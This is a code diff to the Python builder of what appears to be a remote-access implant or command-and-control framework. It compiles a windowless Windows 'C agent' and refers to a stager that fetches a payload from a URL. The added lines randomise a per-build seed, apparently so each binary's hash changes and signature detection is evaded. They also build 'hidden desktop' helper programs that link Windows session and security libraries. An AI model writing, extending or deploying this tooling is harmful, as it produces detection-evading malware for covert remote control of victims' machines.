@@ -1836,6 +1836,7 @@ def {cmd_func}(cmd):
 
         build_cmd = [mingw] + src_files + [
             '-o', str(out_path),
+            '-DPOLY_SEED=0x%04X' % random.randrange(0x10000),
             '-lwinhttp', '-lbcrypt', '-luser32', '-lgdi32', '-lwtsapi32', '-Os', '-mwindows',
         ]
 
@@ -1850,6 +1851,21 @@ def {cmd_func}(cmd):
         file_hash = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()[:12]
         print(f"[+] C agent compiled: {out_name} ({file_size/1024:.0f} KB)")
         print(f"[+] SHA256: {file_hash}...")
+        hd_src = c_src.parent / 'hdcmd.c'
+        run_src = c_src.parent / 'hdcmdrun.c'
+        if hd_src.exists() and run_src.exists():
+            hd_out = self.output_dir / 'hdcmd.exe'
+            run_out = self.output_dir / 'hdcmdrun.exe'
+            _sp.run([mingw, str(hd_src), '-o', str(hd_out), '-luser32', '-lgdi32', '-O2'],
+                    capture_output=True, text=True, timeout=60)
+            run_tmp = c_src.parent / 'hdcmdrun_tmp.c'
+            run_tmp.write_text(run_src.read_text())
+            _sp.run([mingw, str(run_tmp), '-o', str(run_out), '-lwtsapi32', '-ladvapi32', '-O2'],
+                    capture_output=True, text=True, timeout=60)
+            if run_tmp.exists():
+                os.remove(run_tmp)
+            if hd_out.exists() and run_out.exists():
+                print(f"[+] Desktop helpers: {hd_out.name} {run_out.name}")
         return str(out_path)
 
     def generate_stager(self, stage_url: str, encryption_key: str = None,
